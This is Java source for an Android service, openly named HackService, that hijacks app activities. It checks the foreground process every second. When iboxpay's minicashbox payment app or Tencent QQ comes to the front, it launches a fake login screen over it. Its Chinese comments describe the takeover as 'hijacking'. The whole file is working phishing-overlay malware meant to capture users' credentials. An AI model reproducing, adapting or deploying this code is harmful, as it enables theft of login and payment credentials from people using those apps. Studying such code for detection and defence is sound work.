package com.iboxpay.hackandroid;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.HashMap;
import java.util.List;

public class HackService extends Service {
    private static final String TAG = "Hack";
    private boolean hasStart = false;

    HashMap<String, Class<?>> mProcessToHack = new HashMap<String, Class<?>>();


    Handler handler = new Handler();


    Runnable mTask = new Runnable() {


        @Override

        public void run() {

            ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);

            List<ActivityManager.RunningAppProcessInfo> appProcessInfos = activityManager

                    .getRunningAppProcesses();

            // 枚举进程

            Log.w(TAG, "正在枚举进程");

            for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfos) {

                // 如果APP在前台，那么——悲伤的故事就要来了

                if (appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {

                    if (mProcessToHack.containsKey(appProcessInfo.processName)) {

                        // 进行劫持

                        hack(appProcessInfo.processName);

                    } else {

                        Log.w("hack", appProcessInfo.processName);

                    }

                }

            }

            handler.postDelayed(mTask, 1000);

        }


        private void hack(String processName) {

            Log.w("hack", "有程序要悲剧了……");

            if (!((HackApplication) getApplication()).isHacked(processName)) {

                Log.w("hack", "悲剧正在发生");

                Intent hackIntent = new Intent(getBaseContext(),

                        mProcessToHack.get(processName));

                hackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                getApplication().startActivity(hackIntent);

                ((HackApplication) getApplication()).add(processName);

                Log.w("hack", "已经劫持");

            }
        }
    };


    public HackService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (!hasStart) {

            mProcessToHack.put("com.iboxpay.minicashbox",

                    FakeCashboxLoginActivity.class);

            mProcessToHack.put("com.tencent.mobileqq",FakeLoginActivity.class);

            handler.postDelayed(mTask, 1000);

            hasStart = true;

        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        hasStart = false;

        Log.w(TAG, "劫持服务停止");

        ((HackApplication) getApplication()).clear();
    }


}
